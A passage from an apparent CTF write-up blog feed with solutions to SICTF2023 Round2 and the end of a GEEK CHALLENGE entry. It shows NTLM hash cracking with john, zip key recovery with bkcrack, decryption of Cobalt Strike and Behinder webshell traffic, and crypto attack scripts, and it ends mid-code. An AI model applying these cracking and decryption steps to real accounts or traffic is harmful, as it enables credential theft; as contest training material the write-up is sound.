capture</a></p><p>构造出ntlmssp：</p><p><code>jack::WidgetLLC.Internal:3e3966c8cacd29f7:ddd46fd8f78c262eae16918f66185497:010100000000000050fd26d235edd9011219408ccb8a364800000000020012005700490044004700450054004c004c0043000100100043004c00490045004e00540030003300040024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c000300360043004c00490045004e005400300033002e005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c00050024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c000700080050fd26d235edd90106000400020000000800300030000000000000000000000000300000c78e803920758ec5672c36696ee163f6a4e61c8b5463c247daef8571677995a40a001000000000000000000000000000000000000900200053004d00540050002f0075006e007300700065006300690066006900650064000000000000000000</code></p><p>再用john爆破即可：<code>john token.txt --wordlist=rockyou.txt</code></p><p>得到 <code>jack100589barney (jack)</code>，flag：<code>SYC&#123;jack100589barney&#125;</code>。</p><p>​    </p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;第十四届极客大挑战 GEEK CHALLENGE 2023‼️&lt;br&gt;开放注册：10月25日晚10点&lt;br&gt;比赛时间：10月26日晚8点-11月26日晚8点&lt;br&gt;平台链接：&lt;a href=&quot;https://game.sycsec.com/&quot;&gt;ht</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2023赛" scheme="https://lazzzaro.github.io/tags/2023%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>SICTF2023 Round2</title>
    <link href="https://lazzzaro.github.io/2023/09/10/match-SICTF2023-Round2/"/>
    <id>https://lazzzaro.github.io/2023/09/10/match-SICTF2023-Round2/</id>
    <published>2023-09-10T05:39:56.000Z</published>
    <updated>2023-09-10T07:43:36.091Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>SICTF2023 #Round2 是杭州电子科技大学信息工程学院和广东海洋大学联合举办的网络安全赛。</p><p><strong>Rank: 4</strong></p><hr><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="签到-Welcome"><a href="#签到-Welcome" class="headerlink" title="[签到]Welcome"></a>[签到]Welcome</h3><p><code>SICTF&#123;Welcome_to_SICTF2023_#Round2&#125;</code></p><p>​    </p><h3 id="Pixel-art"><a href="#Pixel-art" class="headerlink" title="Pixel_art"></a>Pixel_art</h3><p>LSB隐写：<code>zsteg -E &quot;b1,rgb,lsb,xy&quot; Pixel_art.png &gt; 1.png</code></p><p>提取RGB值：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&#x27;1.png&#x27;</span>)</span><br><span class="line">width , height = img.size</span><br><span class="line">f = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,height):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,width):</span><br><span class="line">tmp = img.getpixel((j,i))</span><br><span class="line">f+=<span class="built_in">bytes</span>(<span class="built_in">list</span>(tmp))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(f)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#xx00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span></span><br></pre></td></tr></table></figure><p>在线ook解码，得flag：<code>SICTF&#123;0141ac35-ec19-4cee-a906-22805fdbed77&#125;</code>。</p><p>​    </p><h3 id="一起上号不"><a href="#一起上号不" class="headerlink" title="一起上号不"></a>一起上号不</h3><p>Cobalt Strike流量分析，参考：<a href="https://blog.scrt.ch/2023/04/01/hex-filtrate/">https://blog.scrt.ch/2023/04/01/hex-filtrate/</a></p><p>提取出最后一个流里的key，解析cookie：</p><p><code>python3 cs-decrypt-metadata.py U8jm3+oqzYLuUiRd9F3s7xVz7fGnHQYIKF9ch6GRseWfcBSSk+aGhWP3ZUyHIkwRo1/oDCcKV7LYAp022rCm9bC7niOgMlsvgLRolMKIz+Eq5hCyQ0QVScH8jDYsJsCyVw1iaTf5a7gHixIDrSbTp/GiPQIwcTNZBXIJrll540s= -f key</code></p><p>拿到Raw key后，再分析流量文件：</p><p><code>python3 cs-parse-traffic.py -r 1ddb06c55884caf491bdb370ca48389c 11.pcapng</code></p><p>得到flag：<code>SICTF&#123;88a39373-e204-43b6-b321-33ac8972fde9&#125;</code></p><p>​    </p><h3 id="baby-zip"><a href="#baby-zip" class="headerlink" title="baby_zip"></a>baby_zip</h3><p>部分明文攻击，<code>1.png</code> 为png图片前18字节：</p><p><code>rbkcrack -C flag.zip -c flag.png -p 1.png</code></p><p>得到key后再提取：</p><p><code>rbkcrack -C flag.zip -c flag.png -k 6424c164 7c334afd f99666e5 -d flag.png</code></p><p>flag：<code>SICTF&#123;3a4998b8-345e-4943-a689-d01e8b08defb&#125;</code></p><p>​    </p><h3 id="还不上号"><a href="#还不上号" class="headerlink" title="还不上号"></a>还不上号</h3><p>flag1.pcapng是冰蝎流量，flag2.pcapng是CS流量。</p><p>先看flag2.pcapng，提取 <code>key.zip</code> 解压，<code>key</code> 中有零宽字符隐写，得到 <code>cd52f1488563bf0e</code>，是冰蝎流量的key。</p><p>flag1.pcapng中，参考Easy_Shark解密代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$key</span>=<span class="string">&quot;cd52f1488563bf0e&quot;</span>;</span><br><span class="line">    <span class="variable">$post</span>=<span class="string">&quot;...&quot;</span>;</span><br><span class="line"><span class="variable">$post</span>=<span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$post</span>, <span class="string">&quot;AES128&quot;</span>, <span class="variable">$key</span>);</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">json_decode</span>(<span class="variable">$post</span>, <span class="literal">true</span>)[<span class="string">&#x27;msg&#x27;</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将响应数据包中的base64字符串带入得到各流的解密内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"># 流2</span><br><span class="line">dvwa_email.png</span><br><span class="line">flag.txt</span><br><span class="line">key</span><br><span class="line">shell.php</span><br><span class="line"></span><br><span class="line"># 流4</span><br><span class="line">SICTF&#123;79e1755e-08a8-4d</span><br><span class="line"></span><br><span class="line"># 流6</span><br><span class="line">rO0ABXNyABRzbGVlcC5ydW50aW1lLlNjYWxhcryvNaxLcOBGAwADTAAFYXJyYXl0ABtMc2xlZXAv</span><br><span class="line">cnVudGltZS9TY2FsYXJBcnJheTtMAARoYXNodAAaTHNsZWVwL3J1bnRpbWUvU2NhbGFySGFzaDtM</span><br><span class="line">AAV2YWx1ZXQAGkxzbGVlcC9ydW50aW1lL1NjYWxhclR5cGU7eHBzcgAec2xlZXAuZW5naW5lLnR5</span><br><span class="line">cGVzLk9iamVjdFZhbHVluXko22Ba54kCAAFMAAV2YWx1ZXQAEkxqYXZhL2xhbmcvT2JqZWN0O3hw</span><br><span class="line">c3IAFWphdmEuc2VjdXJpdHkuS2V5UGFpcpcDDDrSzRKTAgACTAAKcHJpdmF0ZUtleXQAGkxqYXZh</span><br><span class="line">L3NlY3VyaXR5L1ByaXZhdGVLZXk7TAAJcHVibGljS2V5dAAZTGphdmEvc2VjdXJpdHkvUHVibGlj</span><br><span class="line">S2V5O3hwc3IAFGphdmEuc2VjdXJpdHkuS2V5UmVwvflPs4iapUMCAARMAAlhbGdvcml0aG10ABJM</span><br><span class="line">amF2YS9sYW5nL1N0cmluZztbAAdlbmNvZGVkdAACW0JMAAZmb3JtYXRxAH4ADUwABHR5cGV0ABtM</span><br><span class="line">amF2YS9zZWN1cml0eS9LZXlSZXAkVHlwZTt4cHQAA1JTQXVyAAJbQqzzF/gGCFTgAgAAeHAAAAJ6</span><br><span class="line">MIICdgIBADANBgkqhkiG9w0BAQEFAASCAmAwggJcAgEAAoGBAL0M6FR0Cb9dW52Nd5NTA1JUNAs1</span><br><span class="line">thS8iXx6QB+UkN/vRJdfsKS8dnOfNuPuPDCtx26B2j8I1FuTJ1VrrfDkzN585sskmXYronFM98Dx</span><br><span class="line">50vHaadOcDcDdBBqi8gC5/D3iKflX6T9pSL/5PVLfN1EIaFsyAS9jpWX2wGNi3C/QPSrAgMBAAEC</span><br><span class="line">gYAdNhXeGtH4wkWqOhY8aurL+VvTUZjRanJ6C+/FkXCzUWbRVwVV5xMMeZEDNigRw4BZ2HGvJL+f</span><br><span class="line">aMT+o3VMkCYBhGbi2/3RPRgigMG7Aa3LWWtYWsdbw8Mw6aqqbTjDUHrQ1kulMf1JvXJL5LBd+pBA</span><br><span class="line">Q8kHaYJRMcmnLsT4NeXOFQJBAMNa2r+phrThTlagMB6bj6vl0IVbDy+TJT2VybCSJ76rPgVUQwtP</span><br><span class="line">yX3z7UAjt27mE8KK+k7Jidi0drCEPv5Wo60CQQD3vQbO64fko1dlatkNn095GO9KoCuanrsLs+vY</span><br><span class="line">Ohc0ltk4EhHHmP5hEE6dSMZNASKaN0wSYJ14xjnA+dJWOES3AkEApzyYF4vhLefTUIVBrHIvxFCw</span><br><span class="line">+fjCP1AQiXA5gVcdfzTJm3ZPDtf2/kRbzpTE68M7F0gykFAoGcQj92i/JKy24QJAdyVbA+M07Ro9</span><br><span class="line">qxHzJ+EJmMUMOMjFj8xtStiSQeDWTj2KZLQUBvmmxcnQ9UYN0PUNzjtwA5qhwXccSZoctcjECwJA</span><br><span class="line">Zc0TZgGq/OwgnIyj/1+Q9D0A2eg3aw1k+6Vzkf/DdkuF6+XTkYTlBGiETIK/vm1rCH4NcOCL7eK5</span><br><span class="line">qpA1grg+gnQABlBLQ1MjOH5yABlqYXZhLnNlY3VyaXR5LktleVJlcCRUeXBlAAAAAAAAAAASAAB4</span><br><span class="line">cgAOamF2YS5sYW5nLkVudW0AAAAAAAAAABIAAHhwdAAHUFJJVkFURXNxAH4ADHEAfgARdXEAfgAS</span><br><span class="line">AAAAojCBnzANBgkqhkiG9w0BAQEFAAOBjQAwgYkCgYEAvQzoVHQJv11bnY13k1MDUlQ0CzW2FLyJ</span><br><span class="line">fHpAH5SQ3+9El1+wpLx2c5824+48MK3HboHaPwjUW5MnVWut8OTM3nzmyySZdiuicUz3wPHnS8dp</span><br><span class="line">p05wNwN0EGqLyALn8PeIp+VfpP2lIv/k9Ut83UQhoWzIBL2OlZfbAY2LcL9A9KsCAwEAAXQABVgu</span><br><span class="line">NTA5fnEAfgAVdAAGUFVCTElDcHB4</span><br></pre></td></tr></table></figure><p>将流6保存，为flag2.pcapng的实际key。</p><p>回到flag2.pcapng，解析cookie：</p><p><code>python3 cs-decrypt-metadata.py j+ojKDVPlCr7lT9yzNinkj1DgdkcRaLMT2kL4U+9TvdFBZqGKk7/4WF/W7JhEieC3DoRfngRppMAVHa3yfhp4HZm/ZeNY4bc8rlYL11Q0dXDzpR5JjhqN+hGe9RBqPznoukShgQLhxT/DO7djxE5ROzi6NC52yZAaGPCSeLDyjg= -f realkey</code></p><p>拿到Raw key后，再分析流量文件：</p><p><code>python3 cs-parse-traffic.py -r dfc36399da501802482005cf8c768086 flag2.pcapng</code></p><p>得到关键内容：</p><p><code>F       0       09/06/2023 15:52:58     GNSC2OJTHA2S2NDDGA2TIMJVGQ4TSOJVPU======</code></p><p>base32解码得后半部分flag：<code>3d-9385-4c0541549995&#125;</code></p><p>flag：<code>SICTF&#123;79e1755e-08a8-4d3d-9385-4c0541549995&#125;</code></p><p>​    </p><h3 id="Easy-Shark"><a href="#Easy-Shark" class="headerlink" title="Easy_Shark"></a>Easy_Shark</h3><p>冰蝎流量，照着第一个流的PHP加密逻辑代码还原：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$key</span>=<span class="string">&quot;2295d22e2d70888f&quot;</span>;</span><br><span class="line">    <span class="variable">$post</span>=<span class="string">&quot;...&quot;</span>;</span><br><span class="line"><span class="variable">$post</span>=<span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$post</span>, <span class="string">&quot;AES128&quot;</span>, <span class="variable">$key</span>);</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">json_decode</span>(<span class="variable">$post</span>, <span class="literal">true</span>)[<span class="string">&#x27;msg&#x27;</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将响应数据包中的base64字符串带入得到各流的解密内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GronKey.txt</span><br><span class="line">dvwa_email.png</span><br><span class="line">flag.txt</span><br><span class="line">shell.php</span><br><span class="line"></span><br><span class="line"># flag.txt</span><br><span class="line">TGLBOMSJNSRAJAZDEZXGHSJNZWHG</span><br><span class="line"></span><br><span class="line"># GronKey.txt</span><br><span class="line">1,50,61,8,9,20,63,41</span><br></pre></td></tr></table></figure><p>Gronsfeld加密，替换成Vigenere加密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">s = [<span class="number">1</span>,<span class="number">50</span>,<span class="number">61</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">20</span>,<span class="number">63</span>,<span class="number">41</span>]</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">dic = string.ascii_lowercase</span><br><span class="line">key = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> s:</span><br><span class="line">    key += dic[k%<span class="number">26</span>]</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line"></span><br><span class="line"><span class="comment"># byjijulp</span></span><br></pre></td></tr></table></figure><p>Vigenere解密，得 <code>SICTFSHUMUISAGOODBOYYYYYYYYY</code>。</p><p>flag：<code>SICTF&#123;SHUMUISAGOODBOYYYYYYYYY&#125;</code></p><p>​    </p><h3 id="fast-morse"><a href="#fast-morse" class="headerlink" title="fast_morse"></a>fast_morse</h3><p>audacity调慢速度，再<a href="https://morsecode.world/international/decoder/audio-decoder-adaptive.html">在线识别morse</a>，得到 <code>f2a09bf-7f4a-4269-93a5-c8a48360b03c</code>。</p><p>​    </p><h3 id="QR-QR-QR"><a href="#QR-QR-QR" class="headerlink" title="QR_QR_QR"></a>QR_QR_QR</h3><p>交互式01字符串还原二维码，且搞了1000层…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> pyzbar.pyzbar <span class="keyword">import</span> decode</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;210.44.151.51&#x27;</span>,<span class="number">10144</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    x = r.recvuntil(<span class="string">b&#x27;Please&#x27;</span>)[:-<span class="number">7</span>].split(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    MAX = <span class="built_in">len</span>(x)</span><br><span class="line">    pic = Image.new(<span class="string">&quot;RGB&quot;</span>,(MAX,MAX))</span><br><span class="line">    s = <span class="string">b&#x27;&#x27;</span>.join(x)</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,MAX):</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,MAX):</span><br><span class="line">            <span class="keyword">if</span>(s[i] == <span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>)):</span><br><span class="line">                pic.putpixel((x,y),(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                pic.putpixel((x,y),(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line">            i = i+<span class="number">1</span></span><br><span class="line">    pic.save(<span class="string">&quot;flag.png&quot;</span>)</span><br><span class="line"></span><br><span class="line">    decocdeQR = decode(Image.<span class="built_in">open</span>(<span class="string">&quot;flag.png&quot;</span>))</span><br><span class="line">    data = decocdeQR[<span class="number">0</span>].data</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line">    </span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;code:&#x27;</span>,data)</span><br><span class="line">    <span class="built_in">print</span>(r.recvline())</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="问卷调查"><a href="#问卷调查" class="headerlink" title="问卷调查"></a>问卷调查</h3><p><code>SICTF&#123;SICTF_Round3_will_do_even_better!&#125;</code></p><p>​    </p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="签到-古典大杂烩"><a href="#签到-古典大杂烩" class="headerlink" title="[签到]古典大杂烩"></a>[签到]古典大杂烩</h3><p>base100-base62-base64-base58-base32-base62</p><p><code>SICTF&#123;fe853b49-8730-462e-86f5-fc8e9789f077&#125;</code></p><p>​    </p><h3 id="Radio"><a href="#Radio" class="headerlink" title="Radio"></a>Radio</h3><p>CRT</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">n1 =   </span><br><span class="line">n2 =   </span><br><span class="line">n3 =   </span><br><span class="line">c1 =     </span><br><span class="line">c2 =   </span><br><span class="line">c3 =  </span><br><span class="line">e = <span class="number">17</span></span><br><span class="line"></span><br><span class="line">mm = crt([c1,c2,c3],[n1,n2,n3])</span><br><span class="line">m = mm.nth_root(e, truncate_mode=<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m[<span class="number">0</span>])[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SICTF&#123;fdc0afb5-1c81-46b9-a28a-241f5f64419d&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="MingTianPao"><a href="#MingTianPao" class="headerlink" title="MingTianPao"></a>MingTianPao</h3><p>MTP</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Crypto.Util.strxor <span class="keyword">as</span> xo</span><br><span class="line"><span class="keyword">import</span> libnum, codecs, numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isChr</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) &lt;= x <span class="keyword">and</span> x &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>): <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) &lt;= x <span class="keyword">and</span> x &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>): <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">infer</span>(<span class="params">index, pos</span>):</span><br><span class="line">    <span class="keyword">if</span> msg[index, pos] != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    msg[index, pos] = <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">        <span class="keyword">if</span> x != index:</span><br><span class="line">            msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">know</span>(<span class="params">index, pos, ch</span>):</span><br><span class="line">    msg[index, pos] = <span class="built_in">ord</span>(ch)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">        <span class="keyword">if</span> x != index:</span><br><span class="line">            msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ <span class="built_in">ord</span>(ch)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dat = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSpace</span>():</span><br><span class="line">    <span class="keyword">for</span> index, x <span class="keyword">in</span> <span class="built_in">enumerate</span>(c):</span><br><span class="line">        res = [xo.strxor(x, y) <span class="keyword">for</span> y <span class="keyword">in</span> c <span class="keyword">if</span> x!=y]</span><br><span class="line">        f = <span class="keyword">lambda</span> pos: <span class="built_in">len</span>(<span class="built_in">list</span>(<span class="built_in">filter</span>(isChr, [s[pos] <span class="keyword">for</span> s <span class="keyword">in</span> res])))</span><br><span class="line">        cnt = [f(pos) <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x))]</span><br><span class="line">        <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x)):</span><br><span class="line">            dat.append((f(pos), index, pos))</span><br><span class="line"></span><br><span class="line">c = [codecs.decode(x.strip().encode(), <span class="string">&#x27;hex&#x27;</span>) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&#x27;Problem.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).readlines()]</span><br><span class="line"></span><br><span class="line">msg = np.zeros([<span class="built_in">len</span>(c), <span class="built_in">len</span>(c[<span class="number">0</span>])], dtype=<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line">getSpace()</span><br><span class="line"></span><br><span class="line">dat = <span class="built_in">sorted</span>(dat)[::-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> w, index, pos <span class="keyword">in</span> dat:</span><br><span class="line">    infer(index, pos)</span><br><span class="line"></span><br><span class="line">know(<span class="number">1</span>, <span class="number">28</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">know(<span class="number">1</span>, <span class="number">24</span>, <span class="string">&#x27;e&#x27;</span>)</span><br><span class="line">know(<span class="number">1</span>, <span class="number">16</span>, <span class="string">&#x27;t&#x27;</span>)</span><br><span class="line">know(<span class="number">0</span>, <span class="number">10</span>, <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">know(<span class="number">0</span>, <span class="number">12</span>, <span class="string">&#x27;i&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>.join([<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> x]) <span class="keyword">for</span> x <span class="keyword">in</span> msg]))</span><br><span class="line"></span><br><span class="line">key = xo.strxor(c[<span class="number">0</span>], <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> msg[<span class="number">0</span>]]).encode())</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Little Red Riding Hood promise</span></span><br><span class="line"><span class="comment"># d to obey her mother. The gran</span></span><br><span class="line"><span class="comment"># dmother lived out in the woods</span></span><br><span class="line"><span class="comment"># , a half hour from the village</span></span><br><span class="line"><span class="comment"># . When Little Red Riding Hood </span></span><br><span class="line"><span class="comment"># entered the woods a wolf came </span></span><br><span class="line"><span class="comment"># up to her. She did not know wh</span></span><br><span class="line"><span class="comment"># at a wicked animal he was, and</span></span><br><span class="line"><span class="comment">#  was not afraid of him. &quot;Good </span></span><br><span class="line"><span class="comment"># day to you, Little Red Riding </span></span><br><span class="line"><span class="comment"># b&#x27;SICTF&#123;MTP_AtTack_is_w0nderFu1&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="Easy-CopperSmith"><a href="#Easy-CopperSmith" class="headerlink" title="Easy_CopperSmith"></a>Easy_CopperSmith</h3><p>coppersmith解已知p高位攻击。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">n = </span><br><span class="line">c = </span><br><span class="line">ph =  </span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = (ph &lt;&lt; <span 